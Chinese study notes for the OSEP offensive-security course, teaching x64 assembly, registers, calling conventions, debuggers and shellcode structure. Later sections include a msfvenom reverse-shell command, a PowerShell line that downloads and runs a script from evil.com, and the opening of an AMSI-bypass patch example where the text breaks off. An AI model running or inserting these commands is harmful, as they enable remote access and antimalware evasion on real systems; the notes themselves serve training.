---
title: OSEP-前置知识-汇编语言入门
description: '00-前置知识 | 02-汇编语言入门'
pubDate: 2026-01-29
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Assembly
---
# 汇编语言入门 - 写给 Web 安全人员
---

## 【Claude的学习建议】
> **给零基础同学的话**：汇编语言看起来很吓人，但其实你只需要掌握"能看懂"的程度就够了。
>
> **学习目标**：
>
> 1. 看到汇编代码不慌张，能大概理解它在做什么
> 2. 理解寄存器是什么，知道几个重要的寄存器
> 3. 能在调试器中跟踪代码执行
>
> **不需要**：
>
> + 不需要会写汇编代码
> + 不需要记住所有指令
> + 不需要理解每一个细节
>
> **记住**：汇编就是"最原始的编程语言"，每条指令都是告诉CPU做一个简单的动作。
>

---

## 为什么需要了解汇编？
在 OSEP 课程中，你会遇到：

1. **Shellcode 分析**：Shellcode 本质上就是机器码，理解汇编能帮你分析和修改 shellcode
2. **调试器使用**：WinDbg、x64dbg 等工具显示的都是汇编代码
3. **AMSI 绕过**：需要理解函数的汇编实现来进行 patch
4. **逆向工程**：分析恶意软件或绕过安全机制

**好消息**：你不需要精通汇编，只需要能够：

+ 读懂基本的汇编指令
+ 理解函数调用过程
+ 知道如何在调试器中跟踪代码

---

## 第一部分：基础概念
### 1.1 什么是汇编语言？
```plain
高级语言 (C/Python)
        ↓ 编译/解释
汇编语言 (Assembly)
        ↓ 汇编
机器码 (Machine Code)
        ↓
CPU 执行
```

**类比 Web 开发**：

+ 高级语言 = JavaScript
+ 汇编语言 = 浏览器的字节码
+ 机器码 = CPU 直接执行的二进制

### 1.2 x86 vs x64
| 特性 | x86 (32位) | x64 (64位) |
| --- | --- | --- |
| 寄存器大小 | 32 位 | 64 位 |
| 地址空间 | 4 GB | 16 EB |
| 通用寄存器 | EAX, EBX, ECX, EDX | RAX, RBX, RCX, RDX |
| 函数调用约定 | 栈传参 | 寄存器传参 |


**OSEP 主要关注 x64**，因为现代 Windows 系统都是 64 位。

---

## 第二部分：寄存器
### 2.1 什么是寄存器？
寄存器是 CPU 内部的高速存储单元，用于临时存放数据和地址。

**类比**：

+ 内存 = 仓库（容量大但访问慢）
+ 寄存器 = 工作台（容量小但访问快）

> 【Claude的通俗解释】
>
> **为什么需要寄存器？**
>
> 想象你在做饭：
>
> + 冰箱（内存）：存很多食材，但每次拿东西要走过去开门
> + 案板（寄存器）：就在手边，放正在用的食材，拿取超快
>
> CPU做计算时，不可能每次都去内存取数据（太慢了），所以先把要用的数据放到寄存器里，计算完再存回内存。
>
> **OSEP中为什么要知道寄存器？**
>
> + 函数参数通过寄存器传递（RCX, RDX, R8, R9）
> + 返回值放在RAX寄存器
> + 调试时要看寄存器的值
> + 理解shellcode需要知道它在操作哪些寄存器
>

### 2.2 x64 通用寄存器
```plain
64位      32位      16位      8位(高)   8位(低)
┌────────┬────────┬────────┬────────┬────────┐
│  RAX   │  EAX   │   AX   │   AH   │   AL   │  累加器
├────────┼────────┼────────┼────────┼────────┤
│  RBX   │  EBX   │   BX   │   BH   │   BL   │  基址寄存器
├────────┼────────┼────────┼────────┼────────┤
│  RCX   │  ECX   │   CX   │   CH   │   CL   │  计数器
├────────┼────────┼────────┼────────┼────────┤
│  RDX   │  EDX   │   DX   │   DH   │   DL   │  数据寄存器
├────────┼────────┼────────┼────────┼────────┤
│  RSI   │  ESI   │   SI   │   -    │  SIL   │  源索引
├────────┼────────┼────────┼────────┼────────┤
│  RDI   │  EDI   │   DI   │   -    │  DIL   │  目标索引
├────────┼────────┼────────┼────────┼────────┤
│  RBP   │  EBP   │   BP   │   -    │  BPL   │  基址指针
├────────┼────────┼────────┼────────┼────────┤
│  RSP   │  ESP   │   SP   │   -    │  SPL   │  栈指针
└────────┴────────┴────────┴────────┴────────┘

x64 新增寄存器：R8 - R15
64 位      32 位      16 位      8 位
┌────────┬────────┬────────┬────────┐
│  R8    │  R8D   │  R8W   │  R8B   │   第 5 参数 / 通用临时
├────────┼────────┼────────┼────────┤
│  R9    │  R9D   │  R9W   │  R9B   │   第 6 参数 / 通用临时
├────────┼────────┼────────┼────────┤
│  R10   │  R10D  │  R10W  │  R10B  │		syscall 中转 / 临时
├────────┼────────┼────────┼────────┤
│  R11   │  R11D  │  R11W  │  R11B  │		syscall 中转 / 临时
├────────┼────────┼────────┼────────┤
│  R12   │  R12D  │  R12W  │  R12B  │	  长期保存变量(callee)
├────────┼────────┼────────┼────────┤
│  R13   │  R13D  │  R13W  │  R13B  │	  长期保存变量(callee)
├────────┼────────┼────────┼────────┤
│  R14   │  R14D  │  R14W  │  R14B  │		长期保存变量(callee)
├────────┼────────┼────────┼────────┤
│  R15   │  R15D  │  R15W  │  R15B  │		长期保存变量(callee)
└────────┴────────┴────────┴────────┘
```

**寄存器的“位数”，决定了它一次能装多少个 0/1，也就决定了它能表示多大的数、能处理多大的地址。**

#### 1️⃣ 什么是「位（bit）」
**位（bit） = Binary Digit（二进制数字）**

它只有两个状态：

| 状态 | 含义 |
| --- | --- |
| 0 | 关 / 没电 / 否 |
| 1 | 开 / 有电 / 是 |


你可以把它想成：

+ 电灯：关(0) / 开(1)
+ 真假：假(0) / 真(1)
+ 门：关(0) / 开(1)

👉 **一个 bit 只能表达两种情况**

---

#### 2️⃣ 一个 bit 太少了，那怎么办？
那就**把很多 bit 排在一起**

比如：

```plain
01001101
```

这是 **8 个 bit**，我们给它一个名字：

**字节（byte） = 8 bit**

---

#### 3️⃣ bit → byte → 更大的单位
| 单位 | 包含 | 能干嘛 |
| --- | --- | --- |
| 1 bit | 0 / 1 | 判断是或否 |
| 1 byte | 8 bit | 一个字母 |
| 2 byte | 16 bit | 一个整数 |
| 4 byte | 32 bit | 一个常用整数 |
| 8 byte | 64 bit | 指针 / 地址 |


📌 **你之前看到的：8 位 / 16 位 / 32 位 / 64 位，就是这里来的**

####  4️⃣  那“位”在寄存器里是啥意思？
**你刚刚看的寄存器表：**

**8 位 / 16 位 / 32 位 / 64 位**

**意思是：**

| **位数** | **能存多少** |
| --- | --- |
| **8 位** | **0 ～ 255个“不同的数值状态”** |
| **16 位** | **0 ～ 65,535个“不同的数值状态”** |
| **32 位** | **0 ～ 4,294,967,295个“不同的数值状态”** |
| **64 位** | **非常非常大** |


**比如：**

```plain
AL = 8 位 = 一个 byte
AX = 16 位
EAX = 32 位
RAX = 64 位
```

**你可以理解成：**

**同一个箱子，从小盒子到大箱子**

####  5️⃣终于到 8 个 bit（1 byte）啦 🎉
**8 个 bit = 每一位都能是 0 或 1**

**所以状态数是：**

```plain
2⁸ = 256 种
```

**这些状态刚好用来表示：**

```plain
0 ～ 255
```

👉** 一共 256 个数**

由于 **0 也算一个数**！

**就像你数手指：**

```plain
第 1 个状态：0
第 2 个状态：1
...
第 256 个状态：255
```

**所以范围一定是：**

```plain
0 ～ (2⁸ - 1) = 255
```

**  
**👉** 最大那个就是 255**

---

####  6️⃣ 举个特别直观的例子（寄存器）
**假设 RAX 里是：**

```plain
00000000 00000000 00000000 00000000 00000000 00000000 00000000 00001010
```

**这是 ****64 位**

+ **最右边 8 位（AL）：**

```plain
00001010 = 10
```

+ **低 16 位（AX）：**

```plain
00000000 00001010 = 10
```

📌** 名字不同，本质是“看这 64 个 bit 的哪一段”**

####   7️⃣  8位(高) 8位(低)的区分
**先看一个 16 位寄存器（AX）**

**想象 AX 是 ****16 个格子****，从左到右编号：**

```plain
位号: 15 .......... 8 | 7 .......... 0
```

**我们把它拆成两半：**

```plain
┌──────────────┬──────────────┐
│   高 8 位     │   低 8 位     │
│     AH        │     AL        │
└──────────────┴──────────────┘
```

+ **AH（高 8 位）****：左边那 8 个**
+ **AL（低 8 位）****：右边那 8 个**

---

####  8️⃣ 为什么叫“高”和“低”？
**因为****权重不一样****（这点很关键）**

**每一位代表一个数值：**

```plain
位号: 15 14 ... 8 | 7 6 ... 0
权值: 2¹⁵        |       2⁰
```

**所以：**

+ **低 8 位（AL）  
**👉** 决定 ****个位、十位这种小数值**
+ **高 8 位（AH）  
**👉** 决定 256、512、1024 这种大跨度**

####  9️⃣  不同寄存器的功能
👉 **在现代 x64 CPU 里：**

+ **大多数寄存器“本质上没强制功能”**
+ 但：
    - **历史用途**
    - **调用约定**
    - **指令默认行为**

让它们**“看起来像有分工”**

所以你现在要学的是：

**“常见用途” ≠ “只能这么用”**

##### 🔴 RAX —— 累加器（最重要）
###### 核心用途
+ **函数返回值**
+ **算术运算的默认寄存器**
+ **系统调用号（Linux）**

###### 为什么它这么特殊？
**很多指令****默认用 RAX****，比如：**

**mul / div **

👉** 它们强制绑定了 RAX（以及 RDX）**

```plain
mul rbx    ; 隐含使用 RAX   (RDX:RAX = RAX * RBX)
div rcx    ; 被除数在 RAX   

一.解释mul
mul rbx
代表RDX:RAX = RAX * RBX
结果可能 超过 64 位，所以要用 两个寄存器装
其中:为拼接符号，表示高半部分存储RDX 低半部分存储RAX (RDX:RAX 代表 RDX × 2⁶⁴ + RAX)

/* 举个具体例子（秒懂）
假设：
RAX = 10   RBX = 3
执行：
mul rbx
结果是：
RDX:RAX = 30  RDX = 0  RAX = 30  (因为 30 很小，高半部分自然是 0)
*/
/*再看一个会用到 RDX 的例子
RAX = 0xFFFFFFFFFFFFFFFF RBX = 2
mul rbx
结果是（溢出）：
RDX = 1 RAX = 0xFFFFFFFFFFFFFFFE
📌 结论：
mul 一定会改 RAX 和 RDX
*/

二.解释div
这是「无符号除法」
div rcx 这条指令更容易炸程序
规则是：
被除数 = RDX:RAX  除数 = RCX
执行后：
RAX = 商  RDX = 余数
/*一个正确示例
假设你想算：
20 / 3
你必须这样准备寄存器 👇
mov rax, 20
xor rdx, rdx   ; ⚠️ 必须清零高位   (任何数 xor 自己 = 0)
mov rcx, 3
div rcx
结果：
RAX = 6   ; 商
RDX = 2   ; 余数
❌ 不能忘了清 RDX  因为如果RDX 里有垃圾值：
被除数 = RDX:RAX  → 巨大数字
👉 除法溢出 → CPU 抛异常
```

###### 现实总结
**RAX = 万金油 + 返回值 + syscall 中心**

---

##### 🟠 RBX —— 基址寄存器（“稳定寄存器”）
###### 核心用途
+ **存放****长期变量**
+ **常被用作****基址指针**

###### 调用约定特点
+ **callee-saved（被调用者要负责恢复）**

👉** 所以：**

**RBX 适合放“你不想被函数改掉的值”**

---

##### 🟡 RCX —— 计数器（循环之王）
###### 核心用途
+ **循环计数**
+ `**rep movs / stos**`** 的计数器**

###### 调用约定
+ **Windows x64****：第 1 个参数**
+ **Linux x64****：临时寄存器**

###### 现实总结
**RCX = 循环 / 计数 / Windows 参数 1**

---

##### 🟢 RDX —— 数据寄存器（搭档型）
###### 核心用途
+ **算术运算的“高位”**
+ **I/O、系统调用参数**

**比如：**

```plain
mul rbx
; RDX:RAX = 结果
```

###### 调用约定
+ **Windows x64：第 2 个参数**
+ **Linux x64：第 3 个参数**

---

##### 🔵 RSI —— 源索引（Source Index）
###### 核心用途
+ **字符串操作的源地址**

```plain
rep movsb   ; 从 [RSI] 拷贝到 [RDI]
```

###### 调用约定
+ **Linux x64：第 2 个参数**

👉** 非常常见于：**

+ **memcpy**
+ **shellcode**
+ **ROP**

---

##### 🟣 RDI —— 目标索引（Destination Index）
###### 核心用途
+ **字符串操作的目标地址**
+ **Linux x64：第 1 个参数**

```plain
rep stosb   ; 往 [RDI] 写
```

👉** 在 Linux 下：**

**RDI = 第一个参数（超级重要）**

---

##### ⚪ RBP —— 基址指针（栈框架）
###### 核心用途
+ **保存****函数栈帧的基准点**

**传统函数：**

```plain
push rbp
mov rbp, rsp
```

👉** 方便：**

+ **访问局部变量**
+ **调试 / 逆向**

⚠️** 优化编译时可能不用 RBP**

---

##### ⚫ RSP —— 栈指针（绝对不能乱动）
###### 核心用途
+ **指向****当前栈顶**

**所有：**

+ `**call**`
+ `**ret**`
+ `**push**`
+ `**pop**`

**都依赖 RSP**

📌** 一句话：**

**RSP 乱了，程序必崩**

##### x64 新增寄存器：R8 – R15（现代“通用劳动力”）
###### 它们的特点
+ **没有历史包袱**
+ **完全通用**
+ **强烈推荐使用**

---

###### 新增寄存器常见约定用途（非常实用）
###### Linux x64 函数参数顺序
```plain
RDI, RSI, RDX, RCX, R8, R9
```

###### Windows x64 函数参数顺序
```plain
RCX, RDX, R8, R9
```

**所以：**

| **寄存器** | **常见用途** |
| --- | --- |
| **R8** | **参数 / 临时变量** |
| **R9** | **参数 / 临时变量** |
| **R10** | **syscall 中转** |
| **R11** | **syscall 中转** |
| **R12–R15** | **长期保存变量** |


📌** R12–R15 通常是 callee-saved**

## 
### 2.3 特殊用途寄存器
| 寄存器 | 用途 | OSEP 中的重要性 |
| --- | --- | --- |
| **RIP** | 指令指针，指向下一条要执行的指令 | 控制程序流程 |
| **RSP** | 栈指针，指向栈顶 | 函数调用、局部变量 |
| **RBP** | 基址指针，指向当前栈帧 | 访问函数参数和局部变量 |
| **RFLAGS** | 标志寄存器，存储运算结果状态 | 条件跳转 |


> 【Claude的重点解释】
>
> **最重要的三个寄存器（必须记住）**：
>
> **1. RIP（指令指针）**
>
> **2. RSP（栈指针）**
>
> **3. RAX（返回值）**
>

```plain
RIP = "CPU现在执行到哪里了"

想象你在读书：
- 书 = 程序代码
- 你的手指 = RIP
- 手指指到哪，就读哪一行

控制RIP = 控制程序执行流程 = 可以让程序执行任意代码！
这就是为什么"控制RIP"是很多漏洞利用的目标
```

```plain
RSP = "栈顶在哪里"

栈就像一摞盘子：
- 放盘子（PUSH）：RSP往下移
- 拿盘子（POP）：RSP往上移
- RSP永远指向最上面那个盘子

函数调用时，参数、返回地址、局部变量都在栈上
```

```plain
RAX = "函数执行完的结果"

调用任何函数后，返回值都在RAX里
比如：
- CreateThread返回线程句柄 → 在RAX
- VirtualAlloc返回内存地址 → 在RAX
- 函数失败通常返回0或-1 → RAX = 0 或 0xFFFFFFFF
```

### 2.4 x64 函数调用约定 (Windows)
在 Windows x64 中，函数参数通过寄存器传递：

```plain
参数顺序：
第 1 个参数 → RCX
第 2 个参数 → RDX
第 3 个参数 → R8
第 4 个参数 → R9
第 5+ 个参数 → 栈

返回值 → RAX
```

**示例**：调用 `MessageBoxA(NULL, "Hello", "Title", 0)`

```plain
int MessageBoxA(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,   
  UINT   uType
);
```

```plain
xor rcx, rcx          ; 第1个参数: hWnd = NULL (0)
lea rdx, [msg]        ; 第2个参数: lpText = "Hello"
lea r8, [title]       ; 第3个参数: lpCaption = "Title"
xor r9, r9            ; 第4个参数: uType = 0  (任何数 xor 自己 = 0)
call MessageBoxA      ; 调用函数
; 返回值在 RAX 中
```

---

## 第三部分：常用汇编指令
> 【Claude的学习建议】
>
> 不要试图记住所有指令！只需要认识下面这些最常见的就够了。  
遇到不认识的指令，随时可以查。
>
> **最常见的指令（必须认识）**：
>
> + `mov`：移动数据（最最常见）
> + `push/pop`：栈操作
> + `call/ret`：函数调用和返回
> + `xor`：异或（常用来清零）
> + `jmp/je/jne`：跳转
>

### 3.1 数据传送指令
```plain
; MOV - 数据传送（最常用）
mov rax, rbx          ; 将 RBX 的值复制到 RAX
mov rax, 0x1234       ; 将立即数 0x1234 放入 RAX
mov rax, [rbx]        ; 将 RBX 指向的内存值放入 RAX（解引用）
mov [rax], rbx        ; 将 RBX 的值存入 RAX 指向的内存

; LEA - 加载有效地址（Load Effective Address）
lea rax, [rbx+8]      ; 将 RBX+8 的地址放入 RAX（不是值！）
lea rax, [msg]        ; 将 msg 标签的地址放入 RAX

; XCHG - 交换
xchg rax, rbx         ; 交换 RAX 和 RBX 的值
```

**MOV vs LEA 的区别**：

```plain
; 假设 RBX = 0x1000，内存地址 0x1000 处存储值 42

mov rax, [rbx]        ; RAX = 42（取内存中的值）
lea rax, [rbx]        ; RAX = 0x1000（取地址本身）
```

> 【Claude的记忆技巧】
>
> **MOV vs LEA 怎么区分？**
>
> + `MOV`：**M**ove = 移动"内容"
>     - `mov rax, [rbx]` = 去rbx这个地址，把里面的东西拿出来放到rax
>     - 就像"打开信封，取出信纸"
> + `LEA`：**L**oad **E**ffective **A**ddress = 加载"地址"
>     - `lea rax, [rbx]` = 把rbx这个地址本身放到rax
>     - 就像"把信封上的地址抄下来"
>
> **方括号 **`[]`** 的含义**：
>
> + `[rbx]` = "rbx指向的内存位置"
> + 类似C语言的 `*ptr`（解引用）
>

### 3.2 算术运算指令
```plain
; 加法
add rax, rbx          ; RAX = RAX + RBX
add rax, 10           ; RAX = RAX + 10
inc rax               ; RAX = RAX + 1

; 减法
sub rax, rbx          ; RAX = RAX - RBX
dec rax               ; RAX = RAX - 1

; 乘法
imul rax, rbx         ; RAX = RAX * RBX（有符号）
mul rbx               ; RDX:RAX = RAX * RBX（无符号）

; 除法
idiv rbx              ; RAX = RDX:RAX / RBX，余数在 RDX
```

#### 1️⃣ 拼接记号`:`的表示
**表示“把两个寄存器拼在一起，当成一个更大的数”**  
它只是人类写说明时用的 **“拼接记号”**。

把它当成：**高位 : 低位**

**例如: 在 CPU 这里 ：**

```plain
RDX:RAX
意思是：
RDX × 2⁶⁴ + RAX
📌 因为：
RDX 是 高 64 位
RAX 是 低 64 位
```

#### 2️⃣ 为什么要这么“拼”？
因为：

+ 64 位 × 64 位 的结果
+ 或 128 位 ÷ 64 位 的被除数

**一个寄存器装不下**

所以 CPU 规定：

```plain
高位放 RDX
低位放 RAX
```

### 3.3 逻辑运算指令
```plain
; 与、或、异或、非
and rax, rbx          ; RAX = RAX & RBX
or rax, rbx           ; RAX = RAX | RBX
xor rax, rbx          ; RAX = RAX ^ RBX
not rax               ; RAX = ~RAX

; 常见技巧：清零寄存器
xor rax, rax          ; RAX = 0（比 mov rax, 0 更短）

; 位移
shl rax, 4            ; 左移 4 位（相当于乘以 16）
shr rax, 4            ; 右移 4 位（相当于除以 16）
```

> 【Claude的重点解释】
>
> **为什么 **`xor rax, rax`** 比 **`mov rax, 0`** 好？**
>
> + `xor rax, rax` 更短！在shellcode中，每个字节都很宝贵
> + 而且 `mov rax, 0` 包含 `00 00 00 00`（NULL字节），可能导致字符串截断
> + 所以你会在shellcode中经常看到 `xor` 用来清零
>
> **异或的特性（很有用）**：
>
> + 任何数 XOR 自己 = 0
> + 任何数 XOR 0 = 自己
> + A XOR B XOR B = A（可以用来加密/解密）
>

```plain
mov rax, 0    →  机器码: 48 C7 C0 00 00 00 00  (7字节)
xor rax, rax  →  机器码: 48 31 C0              (3字节)
```

### 3.4 比较和跳转指令
```plain
; 比较（设置标志位，不改变操作数）
cmp rax, rbx          ; 比较 RAX 和 RBX（实际执行 RAX - RBX）
test rax, rax         ; 测试 RAX 是否为 0（实际执行 RAX & RAX）

; 无条件跳转
jmp label             ; 跳转到 label

; 条件跳转（基于标志位）
je label              ; Jump if Equal（ZF=1）
jne label             ; Jump if Not Equal（ZF=0）
jz label              ; Jump if Zero（同 je）
jnz label             ; Jump if Not Zero（同 jne）
jg label              ; Jump if Greater（有符号 >）
jl label              ; Jump if Less（有符号 <）
ja label              ; Jump if Above（无符号 >）
jb label              ; Jump if Below（无符号 <）
```

**示例：if-else 结构**

```c
// C 代码
if (x == 0) {
    // do something
} else {
    // do other
}
```

```plain
; 汇编等价
    cmp rax, 0        ; 比较 x 和 0
    jne else_branch   ; 如果不等于，跳到 else
    ; do something
    jmp end_if
else_branch:
    ; do other
end_if:
```

### 3.5 栈操作指令
```plain
; PUSH - 压栈
push rax              ; RSP -= 8; [RSP] = RAX
先把栈顶往下挪 8 个字节（RSP：栈顶指针- 8：因为 64 位 = 8 字节），
然后把 rax 里的东西，放到新的栈顶位置 （[RSP] = “RSP 指向的内存位置”）

; POP - 出栈
pop rax               ; RAX = [RSP]; RSP += 8
⚠️ 原先栈顶数据并没有被擦掉 只是 RSP 不再指向它
; 栈的增长方向：高地址 → 低地址
; PUSH 减小 RSP，POP 增加 RSP
```

**栈的可视化**：

```plain
高地址
┌─────────────┐
│   旧数据     │
├─────────────┤
│   参数 5+    │
├─────────────┤
│  返回地址    │ ← 调用前的 RIP
├─────────────┤
│  保存的 RBP  │ ← RBP 指向这里
├─────────────┤
│  局部变量 1  │
├─────────────┤
│  局部变量 2  │ ← RSP 指向这里
└─────────────┘
低地址
```

```plain
高地址
──────────────
|              | ← 栈底（老数据）
|  返回地址    |
|  保存的 RBP  |
|  局部变量    |
|              |
──────────────
↑ RSP（栈顶）
低地址

push → 往下走
pop → 往上走
```

### 3.6 函数调用指令
```plain
; CALL - 调用函数
call function         ; PUSH 返回地址，然后 JMP 到 function

; RET - 返回
ret                   ; POP 返回地址到 RIP

; CALL 等价于：
push rip              ; 保存返回地址
jmp function          ; 跳转到函数

; RET 等价于：
pop rip               ; 恢复返回地址并跳转
```

---

## 第四部分：理解 Shellcode
> 【Claude的重要说明】
>
> **什么是Shellcode？用最简单的话说：**
>
> Shellcode = 一段可以直接被CPU执行的二进制代码
>
> 它不是普通的程序，不需要.exe文件，不需要操作系统加载。  
只要把它放到内存里，让CPU去执行那个地址，它就能运行。
>
> **为什么叫"Shell"code？**
>
> + 最早的shellcode目的是获取一个shell（命令行）
> + 现在shellcode可以做任何事，但名字保留了下来
>
> **Shellcode长什么样？**
>
> 每个 `\xNN` 就是一个字节，这些字节就是CPU指令的二进制形式。
>

```plain
\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...
```

### 4.1 什么是 Shellcode？
Shellcode 是一段可以独立执行的机器码，通常用于：

+ 获取 shell（命名由来）
+ 执行任意代码
+ 作为漏洞利用的 payload

### 4.2 Shellcode 的特点
1. **位置无关**：不依赖固定地址，可以在任何位置执行
2. **自包含**：不依赖外部库（或动态解析）
3. **紧凑**：尽可能小
4. **避免坏字符**：如 `\x00`（NULL）可能截断字符串

### 4.3 简单 Shellcode 分析
以下是一个简化的 Windows x64 shellcode 框架：

```plain
; 目标：调用 WinExec("calc.exe", 0)

; 步骤 1: 获取 kernel32.dll 基址
; 通过 PEB (Process Environment Block) 获取
mov rax, gs:[0x60]        ; 获取 PEB 地址
mov rax, [rax+0x18]       ; PEB->Ldr
mov rax, [rax+0x20]       ; Ldr->InMemoryOrderModuleList
mov rax, [rax]            ; 第一个模块（ntdll.dll）
mov rax, [rax]            ; 第二个模块（kernel32.dll）
mov rax, [rax+0x20]       ; 模块基址

; 步骤 2: 解析导出表，找到 WinExec 地址
; （这部分比较复杂，涉及 PE 结构解析）

; 步骤 3: 调用 WinExec
lea rcx, [calc_str]       ; 第一个参数："calc.exe"
xor rdx, rdx              ; 第二个参数：0
call rax                  ; 调用 WinExec

calc_str: db "calc.exe", 0
```

#### 一、步骤 1：为什么从 `gs:[0x60]` 开始？
```plain
mov rax, gs:[0x60]   ; 获取 PEB 地址
```

Windows 在 x64 下，把一个“进程信息大总表”  
**PEB（Process Environment Block）**  
固定放在 `gs:[0x60]`

+ `gs`：段寄存器（x64 下专门给线程/进程信息用）
+ `gs:[0x60]`：**当前进程的 PEB 地址**

📌 **这是“绕过 API 的入口点”**

****

从 **gs 段里的 0x60 偏移**  
取一个 8 字节的值  
放进 rax

**这个值是：**

```plain
PEB 的地址
```

现在状态是：

```plain
rax = PEB*
```

---

#### 二、PEB → Ldr → 模块链表
```plain
mov rax, [rax+0x18]  ; PEB->Ldr
mov rax, [rax+0x20]  ; Ldr->InMemoryOrderModuleList
```

PEB 里有个成员叫 `Ldr`  
`Ldr` 里维护着：  
**当前进程加载了哪些 DLL**

这些 DLL 是**双向链表**

****

`**[rax + 0x18]**`** 的意思是：  
****把 rax 当成“一个结构体的起始地址”，  
****取这个结构体里“偏移 0x18 的那个字段”  **

** 这就是 C 语言里的 **`**ptr->field**`

** **👉** rax 现在不再是 PEB，而是 Ldr 结构的地址**

****

****

---

#### 三、为什么连着 `mov rax, [rax]` 两次？
```plain
mov rax, [rax]   ; 第一个模块（ntdll.dll）
mov rax, [rax]   ; 第二个模块（kernel32.dll）
```

**这是你现在最关键该理解的点之一 ****👇**

`InMemoryOrderModuleList` 是：

```plain
[当前模块] → ntdll.dll → kernel32.dll → user32.dll → ...
```

所以：

+ 第一次 `[rax]`：跳到 `ntdll.dll`
+ 第二次 `[rax]`：跳到 `kernel32.dll`

📌 **这是在“顺着链表走”**

不是魔法，只是：

`**rax**`** 里装的是“下一个节点的地址”**

---

#### 四、`mov rax, [rax+0x20]` 为什么是“模块基址”？
```plain
mov rax, [rax+0x20]  ; 模块基址
```

在 Windows 的模块结构里：

+ `+0x20` 偏移 → **DLL 的 ImageBase**
+ 也就是：  
**kernel32.dll 被加载到内存的起始地址**

现在：

```plain
RAX = kernel32.dll 的基址
```

📌 **注意：这还不是 WinExec**

#### 五、`gs:[0x60]` 是 PEB（x64）
**是真的，但属于“系统实现细节”**

+ **Windows x64：**`**gs:[0x60] → PEB**`
+ **Windows x86：**`**fs:[0x30] → PEB**`

📌** 微软****没有在 WinAPI 文档里承诺****  
**📌** 但 Windows 内部、调试器、加载器、反作弊、杀软全在用**

👉** ****稳定性：极高**

---

#### 六、PEB → Ldr → 模块链表结构
**是真的，但字段偏移是实现细节**

**这些结构来自：**

+ `**PEB**`
+ `**PEB_LDR_DATA**`
+ `**LDR_DATA_TABLE_ENTRY**`

**偏移（比如 **`**+0x18**`**, **`**+0x20**`**）：**

+ **在 ****同一大版本**** 内几乎不变**
+ **跨很大版本可能调整**

👉** 这是“逆向工程级知识”，不是 WinAPI**

#### 七、“第二个模块一定是 kernel32.dll”
**常见情况，不是规范保证**

**通常加载顺序是：**

```plain
exe
ntdll.dll
kernel32.dll
kernelbase.dll
user32.dll
...
```

**但：**

+ **某些程序**
+ **某些 loader**
+ **某些防护/沙箱**

**可能会改变顺序**

👉** 所以****严谨写法****是：**

+ **遍历链表**
+ **比较模块名（不靠位置）**

### 4.4 Msfvenom 生成的 Shellcode
```bash
# 生成 Windows x64 反向 shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

输出类似：

```c
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
// ... 更多字节
;
```

每个 `\xNN` 是一个字节的十六进制表示，这就是机器码。

---

## 第五部分：使用调试器
### 5.1 WinDbg 基础命令
![](/image/00-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/02-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8-1.png) 

![](/image/00-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/02-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8-2.png)

WinDbg 是 Windows 官方调试器，OSEP 中会用到：

```plain
; 断点
bp kernel32!CreateFileA   ; 在 CreateFileA 设置断点
bl                        ; 列出所有断点
bc *                      ; 清除所有断点

; 执行控制
g                         ; 继续执行
p                         ; 单步执行（跳过函数调用）
t                         ; 单步执行（进入函数调用）

; 查看信息
r                         ; 显示寄存器
r rax                     ; 显示 RAX 寄存器
u rip                     ; 反汇编当前位置
u kernel32!CreateFileA    ; 反汇编指定函数
db rsp                    ; 以字节显示内存
dq rsp                    ; 以 QWORD 显示内存
dd rsp                    ; 以 DWORD 显示内存

; 内存搜索
s -a 0 L?80000000 "calc"  ; 搜索字符串 "calc"

; 模块信息
lm                        ; 列出加载的模块
x kernel32!*              ; 列出 kernel32 的所有符号
```

### 5.2 x64dbg 基础
![](/image/00-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/02-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8-3.png)

x64dbg 是更友好的图形化调试器：

![](/image/00-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/02-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8-4.png)

| 快捷键 | 功能 |
| --- | --- |
| F2 | 设置/取消断点 |
| F7 | 单步进入 |
| F8 | 单步跳过 |
| F9 | 运行 |
| Ctrl+G | 跳转到地址 |


### 5.3 调试 Shellcode
```c
// 在 shellcode 前添加断点指令
unsigned char shellcode[] =
    "\xcc"  // INT 3 - 断点指令
    "\xfc\x48\x83\xe4\xf0..."  // 实际 shellcode
;
```

当执行到 `\xcc` 时，调试器会中断，你可以单步跟踪 shellcode 的执行。

---

## 第六部分：OSEP 中的汇编应用
### 6.1 AMSI 绕过中的汇编
AMSI 是 **Windows 里的一个安全接口**，全名是：

**AMSI = Antimalware Scan Interface（反恶意软件扫描接口）**

AMSI 的核心作用只有一件事：

**在代码“真正执行之前”，把内容交给杀毒软件检查**

**它不是杀毒软件本身，而是一个 “中间人 / API 接口”。**

AMSI 重点盯的是 **“动态执行的代码”**，比如：

#### 1️⃣ PowerShell（重点中的重点）
```plain
IEX (New-Object Net.WebClient).DownloadString("http://evil.com/a.ps1")
```

➡** 在执行前，PowerShell 会把 ****脚本内容**** 送给 AMSI  
**➡** AMSI 再交给 Defender / 360 / 卡巴斯基 等**

---

#### 2️⃣ JScript / VBScript
```plain
eval("恶意代码")
```

---

#### 3️⃣ Office 宏（VBA）
---

#### 4️⃣ .NET 里动态生成的代码
+ `**Assembly.Load**`
+ `**Reflection.Emit**`

---

#### AMSI 的工作流程（非常重要）
```plain
脚本 / 代码
   ↓
AMSI API
   ↓
杀毒引擎（Defender 等）
   ↓
允许 / 拦截
```

👉** 不是执行完再查，是执行前就查**

****

****

#### AMSI (Antimalware Scan Interface) 绕过通常需要 patch 函数：
```plain
; AmsiScanBuffer 函数开头
AmsiScanBuffer:
    mov [rsp+8], rbx      ; 原始指令
    mov [rsp+10h], rbp
